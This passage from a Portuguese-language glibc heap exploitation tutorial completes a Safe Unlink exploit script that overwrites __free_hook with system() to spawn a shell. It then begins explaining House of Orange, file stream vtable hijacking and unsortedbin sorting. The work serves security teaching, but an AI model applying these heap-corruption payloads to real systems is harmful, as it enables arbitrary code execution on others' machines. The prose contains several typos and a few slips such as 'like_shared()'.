A malloc então realizou o processo de checagem do <em>safe unlink</em> em nosso <em>chunk</em> construído. Primeiro ela seguiu nosso “fd” e checou que o “bk” do destino apontava de volta para nosso <em>chunk</em> construído. Fizemos o <em>bypass</em> dessa checagem alinhando nosso endereço de “fd” 24 bytes antes da primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code>, fazendo com que o primeiro endereço válido fosse sua primeira entrada, que apontava de volta para nosso <em>chunk</em> construído.<br />
Depois a malloc seguiu nosso “bk” e performou a mesma checagem na “fd” da <code class="language-plaintext highlighter-rouge">m_array</code>. Fizemos o <em>bypass</em> desta checagem com a mesma técnica utilizada na primeira parte, alinhamos nosso “bk” 16 bytes antes da primeira entrada da <code class="language-plaintext highlighter-rouge">m-array</code>, fazendo com que o primeiro endereço válido fosse sua primeira entrada, que apontava de volta para nosso <em>chunk</em> construído.<br />
Uma vez que nosso <em>chunk</em> construído passou pela checagem do <em>safe unlink</em> ele foi desvinculado.<br />
Isso fez com que o <em>pointer</em> para nosso <em>chunk</em> falso, apontasse para seu próprio endereço, menos 24 bytes.<br />
Como o programa utiliza este <em>pointer</em> para gravar operações que controlamos, fomos capazes de sobrescrever este endereço novamente, com o endereço da nossa <em>target</em>, nos permitindo finalmente sobrescrevê-la.</p>
</blockquote>

<h3 id="execução-de-código-via-safe-unlink">Execução de código via Safe Unlink</h3>

<p>Agora que fomos capazes de realizar escrita arbitrária com a técnica <code class="language-plaintext highlighter-rouge">Safe Unlink</code>, podemos nos aproveitar da vulnerabbilidade para conseguir execução de código, em nosso caso, obter um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<p>Aproveitando o script anterior, podemos alterar o endereço da <code class="language-plaintext highlighter-rouge">m_array</code> na edição do <em>chunk</em> de índice zero, para o endereço da <code class="language-plaintext highlighter-rouge">free hook</code>, de forma parecida com o que fizemos nas outras técnicas.</p>

<p>Desta forma, a próxima vez que tentarmos editar o <em>chunk</em> no índice zero, vamos sobrescrever a <code class="language-plaintext highlighter-rouge">free hook</code>, que podemos substituir com o endereço da função <code class="language-plaintext highlighter-rouge">system()</code>.<br />
O únco problema disso, é que quando liberarmos o único <em>chunk</em> que podemos, no índicce zero, o seu <em>pointer</em> será o endereço da <code class="language-plaintext highlighter-rouge">free hook</code>, onde não poderems escrever nossa <em>string</em> “/bin/sh”.</p>

<p>Poderíamos utilizar o one_gadget, porém existe uma forma mais simples. Ao invés de substituir o endereço da <code class="language-plaintext highlighter-rouge">m_array</code> com o endereço da <code class="language-plaintext highlighter-rouge">free hook</code>, poderiamos substituir pelo endereço da <code class="language-plaintext highlighter-rouge">free hook</code> menos 8 bytes.<br />
Desta forma, poderíamos escrever nossa <em>string</em> “/bin/sh” exatamente um <em>quadword</em> antes da <code class="language-plaintext highlighter-rouge">free hook</code>, seguido do endereço da função <code class="language-plaintext highlighter-rouge">system()</code>. Assim, esta <em>string</em> estará presente em um <em>quadword</em> antes da <code class="language-plaintext highlighter-rouge">system()</code>, se tornando o comando <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>. Vamos fazer estas alterações no mesmo script utilizado para escrita arbitrária, cujo bloco de exploração fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">24</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">16</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x80</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo a m_array (forma com erro)
#edit(chunk_A, p64(fd) + p64(bk) + p8(0)*0x70 + p64(prev_size) + p64(fake_size))
</span>
<span class="c1"># sobrescrevendo a m_array com um chunk "construido"
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># liberando o chunkB e ativando o unlinking dos chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>

<span class="c1"># sobrescrevendo a primeira entrada do m_array com o endereco da free hook - 8 bytes
</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>

<span class="c1"># sobrescrevendo o conteudo do endereco com a string "/bin/sh" seguido do endereco da system()
</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>

<p>Com o script pronto, podemos executá-lo com as opções do GDB, e visualizar a <code class="language-plaintext highlighter-rouge">__free_hook</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_232.png" alt="Free hook apontando para system()" /></p>

<p>Conforme podemos observar, neste momento a <code class="language-plaintext highlighter-rouge">free hook</code> foi sobrescrita com o endereço da função <code class="language-plaintext highlighter-rouge">system()</code>. Se consultarmos a primeira entrada da <code class="language-plaintext highlighter-rouge">m_array</code>, que ainda não foi liberada, veremos que ela aponta para a <em>string</em> “/bin/sh*, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_233.png" alt="m_array apontando para &quot;/bin/sh&quot;" /></p>

<p>Tudo que é preciso fazer, é liberar o <em>chunk</em> zero. A <code class="language-plaintext highlighter-rouge">free hook</code> vai redirecionar a função <code class="language-plaintext highlighter-rouge">free()</code> para a função <code class="language-plaintext highlighter-rouge">system()</code> e o argumento passado para ela, será um <em>pointer</em> para a <em>string</em> “/bin/sh”. Vamos voltar para o script e adicionar a linha que libera o <em>chunk</em> zero, ficando desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">24</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">m_array</span> <span class="o">-</span> <span class="mi">16</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x80</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo a m_array (forma com erro)
#edit(chunk_A, p64(fd) + p64(bk) + p8(0)*0x70 + p64(prev_size) + p64(fake_size))
</span>
<span class="c1"># sobrescrevendo a m_array com um chunk "construido"
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x80</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mh">0x60</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># liberando o chunkB e ativando o unlinking dos chunks
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>

<span class="c1"># sobrescrevendo a primeira entrada do m_array com o endereco da free hook - 8 bytes
</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mi">8</span><span class="p">))</span>

<span class="c1"># sobrescrevendo o conteudo do endereco com a string "/bin/sh" seguido do endereco da system()
</span><span class="n">edit</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>

<span class="c1"># liberando o chunk 0 e redirecionado a free() para system()
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>

<p>Agora se executarmos o script em condições de produção, teremos o <code class="language-plaintext highlighter-rouge">shell</code>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_234.png" alt="Shell obtido" /></p>

<p>E este é um exemplo da técnica <code class="language-plaintext highlighter-rouge">Safe Unlink</code>, o equivalente moderno da técnica <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code>. Para conseguirmos o resultado, é preciso ser capaz de retirar a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> de um <em>chunk</em> alocado, do qual utilizamos <em>overflow</em> para sobrescrever. Também precisamos saber o endereço de um <em>pointer</em> para um <em>chunk</em>, neste caso em específico, utilizamos um armazenado pelo próprio programa em seu <em>data section</em>.</p>

<h1 id="the-house-of-orange">THE HOUSE OF ORANGE</h1>

<p>Provavelmente uma das técnicas mais complexas existentes, a técnica <code class="language-plaintext highlighter-rouge">The House of Orange</code> foi desnenvolvida em 2016 por <code class="language-plaintext highlighter-rouge">4ngelboy</code> e descrita em seu artigo <code class="language-plaintext highlighter-rouge">HITCON CTF Qual 2016: House of Orange Write up</code>. Esta técnica foi feita com o único intúito de responder com um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<p>A técnica <code class="language-plaintext highlighter-rouge">The House of Orange</code> pode ser quebrada em três fases, das quais vamos abordar em ordem reversa, para melhor entendimento. Até o momento, utilizamos a <code class="language-plaintext highlighter-rouge">malloc hooks</code> para conseguir um <code class="language-plaintext highlighter-rouge">shell</code>, mas neste momento, vamos cobrir uma nova técnica chamada de <code class="language-plaintext highlighter-rouge">file stream exploitation</code>.</p>

<h2 id="fase-3---file-stream-exploitation">Fase 3 - File Stream Exploitation</h2>

<p>Até o momento, exploramos a <code class="language-plaintext highlighter-rouge">malloc hooks</code> para conseguir um <code class="language-plaintext highlighter-rouge">shell</code>, porém, entre a infinidade de técnicas existentes, temos a chamada “<em>file stream exploitation</em>”, que é uma forma de tomar vantaggem de uma funcionalidade fundamental da GLIBC para, entre outras coisas, obter execução de arbitrária de código.</p>

<p>Quando requisitamos acesso a um arquivo no Linux, este processo é iniciado com um <em>file descriptor</em> ou “fd” (não confundir com “fd” da <em>heap</em> que significa <em>forward pointer</em>).<br />
<em>File descriptors</em> são representados por inteiros positivos que o processo pode utilisar como um identificador para um recurso. Mas, trabalhar com arquivos utilizando <em>file descriptors</em> pode se tornar problemático, pois é possível ler e escrever, mas frequentemente a maneira na qual precisamos lidar com arquivos, é mais sutil.</p>

<p>E é por isso que a GLIBC implementou os <em>file stremas</em>, eles “encapsulam” os <em>file descriptors</em> e oferecem algumas funcionalidades como I/O em <em>buffer</em> e o “desfazer” (<em>undo</em>).<br />
Eles tomam a forma de estruturas <code class="language-plaintext highlighter-rouge">_IO_FILE</code> na memória, e são para elas que funções como <code class="language-plaintext highlighter-rouge">fopen()</code> retornam seus ponteiros.</p>

<p>É possível visualizarmos a estrutura da <code class="language-plaintext highlighter-rouge">_IO_FILE</code> com o próprio GDB. Se carregarmos qualquer binário no GDB, como por exemplo o “/bin/sh” e inserirmos o comando <code class="language-plaintext highlighter-rouge">start</code> para nos certificarmos de carregar todas as bibliotecas, podemos utilizar o comando <code class="language-plaintext highlighter-rouge">dt "struct _IO_FILE"</code> para visualizarmos sua estrutura, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_149.png" alt="Estrutura da _IO_FILE" /></p>

<p>Conforme mencionado anteriormente, a estrutura <code class="language-plaintext highlighter-rouge">_IO_FILE</code> “encapsula” os <em>file descriptors</em>. Podemos ver ilustrado na imagem abaixo que os <em>file streams</em> consistem primordialmente de <em>buffers</em> de caracteres.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_150.png" alt="Buffers de caracteres" /></p>

<p>Estes <em>buffers</em> são utilizados para dar suporte as funcionalidades citadas anteriormente como <em>buffered I/O</em> e <em>undo</em>.</p>

<p>No início da estrutura, temos o membro <code class="language-plaintext highlighter-rouge">_flags</code> que determina o estado do <em>stream</em> do arquivo.<br />
Também existe o membro <code class="language-plaintext highlighter-rouge">_chain</code>, este indica que existe um <em>pointer</em> para outra estrutura <code class="language-plaintext highlighter-rouge">_IO_FILE</code>, eles formam ligações em uma lista não circular que contém todos os arquivos abertos em um processo.</p>

<blockquote>
  <p>O cabeçalho de uma lista de arquivos abertos contém um símbolo que se chama <code class="language-plaintext highlighter-rouge">_IO_list_all</code>.<br />
Toda vez que um novo arquivo é aberto por uma função como <code class="language-plaintext highlighter-rouge">fopen()</code>, uma estrutura <code class="language-plaintext highlighter-rouge">_IO_FILE</code> é criada na <em>heap</em> e é ligado ao cabeçalho pela lista <code class="language-plaintext highlighter-rouge">_IO_list_all</code>, muito parecido com uma <em>fastbin</em> para arquivos.</p>
</blockquote>

<p>O membro <code class="language-plaintext highlighter-rouge">_mode</code> pode desabilitar um <em>file stream</em> e seu uso será explorado mais adiante.</p>

<p>Por agora, vamos visualizar a <code class="language-plaintext highlighter-rouge">_IO_list_all</code> com o comando <code class="language-plaintext highlighter-rouge">print _IO_list_all</code>, conforme a imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_151.png" alt="IO_list_all" /></p>

<p>Podemos notar que o seu <em>type</em> é <code class="language-plaintext highlighter-rouge">_IO_FILE_plus</code>. Esta estrutura é só um “encapsulador” da estrutura <code class="language-plaintext highlighter-rouge">_IO_FILE</code> que adiciona um apontador <code class="language-plaintext highlighter-rouge">vtable</code> para ela. Podemos confirmar com o comando <code class="language-plaintext highlighter-rouge">dt</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_152.png" alt="Estrutura _IO_FILE_plus" /></p>

<h3 id="vtables">Vtables</h3>

<p>As <code class="language-plaintext highlighter-rouge">vtables</code> representam uma forma de implementar polimorfismo em linguagens orientadas a objeto, como C++. Para representar de forma abstrada, vamos fazer a seguinte analogia:</p>

<p>Vamos supor que tenhamos uma <code class="language-plaintext highlighter-rouge">classe</code> chamada “carro”, que por sua vez tenha um método chamado <code class="language-plaintext highlighter-rouge">accelerate()</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_153.png" alt="Classe carro" /></p>

<p>Quando derivamos esta classe para diferentes carros como <code class="language-plaintext highlighter-rouge">Porsche</code> e <code class="language-plaintext highlighter-rouge">Ferrari</code>, podemos querer que estes diferentes carros acelerem de forma diferente, então fazemos com que o método <code class="language-plaintext highlighter-rouge">accelerate()</code> se torne uma função “<em>virtual</em>”, simplesmente permitindo que tanto o <code class="language-plaintext highlighter-rouge">Porsche</code> quanto a <code class="language-plaintext highlighter-rouge">Ferrari</code> possam sobrescrever a função original <code class="language-plaintext highlighter-rouge">accelerate()</code> com suas próprias implementações.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_154.png" alt="Derivando a classe" /></p>

<p>Quando o método <code class="language-plaintext highlighter-rouge">accelerate()</code> é chamado diretamente do objeto <code class="language-plaintext highlighter-rouge">carro</code>, a chamada pode ir diretamente para a versão apropriada do método.</p>

<p>Mas, considere que uma função que tem como como argumento qualquer tipo de carro, então chama o método <code class="language-plaintext highlighter-rouge">accelerate()</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_155.png" alt="Chamando qualquer carro" /></p>

<p>Esta função pode acabar chamando tanto a <code class="language-plaintext highlighter-rouge">accelerate()</code> do <code class="language-plaintext highlighter-rouge">Porsche</code> quanto a da <code class="language-plaintext highlighter-rouge">Ferrari</code>, e não há um jeito no qual o compilador possa dizer qual tipo de carro está sendo usado no momento.</p>

<p>Isto é chamado de “polimorfismo”, e linguagens como C++ frequentemente não especificam como isso pode ser implementado, porém, uma solução é usar as <em>vtables</em>.</p>

<p>Simplificando o máximo possível, o princípio básico é dar para cada classe que usa funções virtuais uma “<em>virtual function table</em>”, ou <em>vtable</em>.</p>

<p>Normalmente, existe apenas uma <em>vtable</em> por classe, e cada objeto instanciado desta classe recebe um <em>pointer</em> para sua <em>vtable</em> correspondente. Por exemplo, nosso <code class="language-plaintext highlighter-rouge">Porsche</code> e nossa <code class="language-plaintext highlighter-rouge">Ferrari</code> podem ter uma <em>vtable</em> como a da imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_156.png" alt="Vtables" /></p>

<p>A terceira entrada na <em>vtable</em> do <code class="language-plaintext highlighter-rouge">Porsche</code> aponta para a <code class="language-plaintext highlighter-rouge">accelerate()</code> do <code class="language-plaintext highlighter-rouge">Porsche</code> e a terceira entrada da <em>vtable</em> da <code class="language-plaintext highlighter-rouge">Ferrari</code> aponta para a <code class="language-plaintext highlighter-rouge">accelerate()</code> da <code class="language-plaintext highlighter-rouge">Ferrari</code><br />
Todos os objetos <code class="language-plaintext highlighter-rouge">Porsches</code> e <code class="language-plaintext highlighter-rouge">Ferraris</code> também possuem um <em>pointer</em> para sua <em>vtable</em>.</p>

<p>Agora, quando a função descrita anteriormente precisar chamar a versão correta do método <code class="language-plaintext highlighter-rouge">accelerate()</code> de algum carro, tudo que precisa fazer é seguir o <em>pointer</em> da <em>vtable</em> do objeto e chamar a terceira entrada desta <em>vtable</em>.</p>

<p>Quando exploramos binários compilados em C++, existe uma vulnerabilidade chamada “<em>vtable highjacking</em>”.<br />
Explorando esta vulnerabilidade, abusamos do processo de sobrescrever o <em>pointer</em> de uma <em>vtable</em> de um objeto utilizando algum <em>bug</em> como <em>overflow</em>, então o apontamos para uma <em>vtable</em> falsa que tenhamos controle, conforme ilustrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_157.png" alt="Apontando objeto para vtables falsa" /></p>

<p>Neste cenário, podemos configurar a terceira entrada da nossa <em>vtable</em> falsa para o endereço de um <em>gadget</em>, então, da próxima vez que o método <code class="language-plaintext highlighter-rouge">accelerate()</code> deste objeto for chamado, conseguimos um <code class="language-plaintext highlighter-rouge">shell</code>.</p>

<blockquote>
  <p>Contextualizando em nosso cenário atual, as bibliotecas GNU C e C++ estão ligadas no Linux.<br />
Se debugarmos um programa C++ no Linux, vamos perceber que junto a biblioteca padrão C++, a biblioteca padrão C também será carregada.<br />
Isto acontece porque a biblioteca GNU C++ utiliza algumas funcionalidades de baixo nível da biblioteca C ao invés de reimplementá-las.<br />
Por exemplo, se debugarmos um programa em C++ que abre um arquivo, e setarmos um <em>breakpoint</em> na função <code class="language-plaintext highlighter-rouge">fopen()</code> da biblioteca C, perceberemos que a biblioteca padrão C++ está, na verdade, chamando a biblioteca padrão C para prformar as operações em baixo nível.<br />
Isto também acontece nos métodos C++ <code class="language-plaintext highlighter-rouge">like_shared()</code> e <code class="language-plaintext highlighter-rouge">make_unique()</code>, dos quais ambos utilizam as funções <code class="language-plaintext highlighter-rouge">malloc</code> da biblioteca padrão C em <em>background</em>.</p>
</blockquote>

<p>No caso da estrutura <code class="language-plaintext highlighter-rouge">_IO_FILE_plus</code>, ela recebe um <em>pointer</em> na <em>vtable</em> compatível com a classe <code class="language-plaintext highlighter-rouge">streambuf</code> do C++, e por esta razão, isto torna os <em>file streams</em> da GLIBC vuneráveis a <em>vtable hihjacking</em>, uma forma de <em>file stream exploitation</em>.</p>

<p>Portanto <em>file streams</em> são alvos valiosos, e uma vez que um novo <em>file stream</em> é criado dentro de uma <em>heap</em>, ele é potencialmente vulnerável a diferentes classes de <em>bugs</em>, como <em>overflow</em> e <em>double free</em> que já exploramos anteriormente.</p>

<p>Porém, diferente do que aparenta, não precisamos que um arquivo seja aberto para explorar esta vulnerabilidade. Pois qualquer processo que utilize a biblioteca GNU C, sempre terá ao menos três <em>file streams</em> conhecidos como <em>I/O file streams</em> padrões:</p>

<ul>
  <li><code class="language-plaintext highlighter-rouge">stdin</code></li>
  <li><code class="language-plaintext highlighter-rouge">stdout</code></li>
  <li><code class="language-plaintext highlighter-rouge">stderr</code></li>
</ul>

<p>Mesmo um programa que não imprime nenhuma saída ou que não aceite nenhum comando de entrada, terá os <em>I/O file streams</em> padrões presentes no <em>data section</em> na GLIBC.<br />
E a mesma coisa se repete em programas mais complexos que utilizam GUI. Podemos comprovar isto abrindo o navegador <code class="language-plaintext highlighter-rouge">Firefox</code> e atrelando seu PID ao GDB com o comando <code class="language-plaintext highlighter-rouge">gdb --pid $(pgrep firefox)</code> e imprimindo o valor do cabeçalho da <code class="language-plaintext highlighter-rouge">_IO_list_all</code> conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_158.png" alt="_IO_list_all do Firefox" /></p>

<p>Como podemos ver, <code class="language-plaintext highlighter-rouge">stderr</code> foi o ultimo arquivo a ser aberto representado pelo <code class="language-plaintext highlighter-rouge">stderr file stream</code>. Seguindo o <em>pointer</em> <code class="language-plaintext highlighter-rouge">_chain</code> deste <em>file stream</em> nos leva ao <code class="language-plaintext highlighter-rouge">stdout file stream</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_159.png" alt="Seguindo o file stream" /></p>

<p>E seguindo novamente, somos levados ao <code class="language-plaintext highlighter-rouge">stdin file stream</code>, onde a sequência termina, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_160.png" alt="Seguindo o file stream" /></p>

<p>O comando <code class="language-plaintext highlighter-rouge">xinfo</code> nos mostra que o <code class="language-plaintext highlighter-rouge">stdout file stream</code>, representado pela estrutura <code class="language-plaintext highlighter-rouge">_IO_FILE_plus</code> se encontra no <em>data section</em> da GLIBC, assim como <code class="language-plaintext highlighter-rouge">stdin</code> e <code class="language-plaintext highlighter-rouge">stderr</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_161.png" alt="Stdout na GLIBC" /></p>

<p>Portanto, mesmo que um binário não abra nenhum arquivo, ou utilize nenhum dos <em>I/O file streams</em> padrões, eles ainda estarão presentes para podermos utilizar técnicas de <em>file stream exploitation</em>.</p>

<p>Esta técnica pode se tornar um “coringa” no uso de diversas formas de dexploração da memória <em>heap</em>.</p>

<h2 id="fase-2---unsortedbin-attack">Fase 2 - Unsortedbin Attack</h2>

<p>Para entendermos esta fase da exploração, precisamos entender o relacionamento entre o <em>unsortedbin</em> e a arena.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_235.png" alt="Destino de um chunk" /></p>

<p>Sabemos que existem vários destinos que um <em>chunk</em> pode adotar quando é liberado. Se ele se qualifica para os <em>fastbins</em> ele é ligado diretamente na lista dos <em>fastbins</em>. Se ele é grande damis para os <em>fastbins</em>, e é adjacente ao <em>top chunk</em> ou é consolidado com um <em>chunk</em> que é adjacente ao <em>top chunk</em>, ele é consolidado no próprio <em>top chunk</em>. Se ele é grande demais para o <em>fastbins</em> e não é adjacente ao <em>top chunk</em> ele é vinculado ao <em>unsortedbin</em> após a consolidação.</p>

<p>Porém ainda existem mais duas listas que não são populadas diretamente pela função <code class="language-plaintext highlighter-rouge">free()</code>. Os <em>chunks</em> pertencentes ao <em>unsortedbins</em> são movidas para estas duas listas, através de um processo chamado <em>sorting</em>, que ocorre durante uma chamada para a <code class="language-plaintext highlighter-rouge">malloc()</code>. Estes <em>bins</em>  são chamados de <code class="language-plaintext highlighter-rouge">Smallbins</code> e <code class="language-plaintext highlighter-rouge">Largebins</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_236.png" alt="Smallbins e largebins" /></p>

<p>Na estrutura da arena, os <em>smallbins</em>  se iniciam logo após o <em>unsortedbin</em>  e os <em>largebins</em>  se iniciam logo após os <em>smallbins</em>.</p>

<p>Os <em>smallbins</em> são uma colação de de listas duplamente ligadas e circulares. Em uma arena, podem haver 62 <em>smallbins</em> com tamanhos entre <code class="language-plaintext highlighter-rouge">0x20</code> e <code class="language-plaintext highlighter-rouge">0x3f0</code> bytes. A estrutura do <em>smallbuins</em> segue o padrão FIFO (“<em>First in First out</em>”) assim como no <em>unsortedbin</em>, porém cada lista dentro do <em>smallbin</em> corresponde a um tamanho específico, assim como no <em>fastbin</em></p>

<p>Os <em>largebins</em>  também são uma coleção de listas duplamente ligadas e circulares, porém estas listas tem um range de tamanhos que podem ser de <code class="language-plaintext highlighter-rouge">0x400</code> bytes para mais.</p>

<p>O processo de <em>sorting</em> responsavel por mover <em>chunks</em> de um <em>unsortedbin</em> até um <em>smallbin</em> ou <em>largebin</em> se inicia quando a malloc procuram por um <em>unsortedbin</em> enquanto tenta ao mesmo tempo atender uma requisição.</p>

<p>Conforme vimos no fluxo do <em>unsafe unlink</em>, novos <em>chunks</em> liberados são adicionados ao topo do <em>unsortedbin</em>, porém, durente as requisições a malloc procura do ultimo para o primeiro. As alocações feitas a partir da <em>unsortedbin</em> precisa compreender o tamanho exato da requisição, por exemplo, uma requisição de <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes e a malloc procurar na <em>unsortedbin</em>, esta só irá retornar quando encontrar um <em>chunk</em> livre com este exato tamanho, mesmo que existam <em>chunks</em> maiores disponíveis.</p>

<p>Durante este processo de procura de um <em>chunk</em> com o tamanho exato da requisição, a malloc acaba passando por vários outros <em>chunks</em> cujo tamanho não corespondem à requisição, estes <em>chunks</em> passam pelo processo de <em>sorting</em> e são ovidos para seus respectivos <em>smallbins</em> e <em>largebins</em>.</p>

<p>O exemplo abaixo, mostra de forma abstrata o que ocorre durante o processo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_237.png" alt="Processo de sorting" /></p>

<p>Supondo que um <em>unsortedbin</em> contenha quatro <em>chunks</em> com tamanhos de <code class="language-plaintext highlighter-rouge">0x100</code>, <code class="language-plaintext highlighter-rouge">0x90</code>, <code class="language-plaintext highlighter-rouge">0x400</code> e <code class="language-plaintext highlighter-rouge">0x230</code> bytes, se fizermos uma requisição de um <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes enquanto a <em>smallbin</em> estiver vazia, a malloc irá comaçar a procurar no <em>unsortedbin</em> de trás para frente, seguindo a “bk” do topo da <em>unsortedbin</em> na arena até o ultimo <em>chunk</em> da lista.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_238.png" alt="Processo de sorting" /></p>

<p>Este <em>chunk</em> não se enquadra no tamanho da requisição, pois não tem <code class="language-plaintext highlighter-rouge">0x90</code> bytes de tamanho, então a malloc faz o processo de <em>sorting</em> e move este <em>chunk</em> para o <em>smallbins</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_239.png" alt="Processo de sorting" /></p>

<p>Então a malloc continua a procura e encontra o <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x400</code> bytes de tamanho, que também não corresponde ao tamanho exato da requisição. Portanto, a malloc faz seu processo de <em>sorting</em> o movendo para o <em>largebins</em>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_240.png" alt="Processo de sorting" /></p>

<p>Então a malloc encontra o <em>chunk</em> de <code class="language-plaintext highlighter-rouge">0x90</code> bytes de tamanho, que se enquadra no tamanho da requisição, o aloca e termina sua busca.</p>

<p>Quando cada um dos <em>chunks</em> do exemplo passam pelo pelo <em>sorting</em> ou são alocados, eles precisam passar pelo processo de <em>unlinking</em> do <em>unsortedbin</em>.</p>

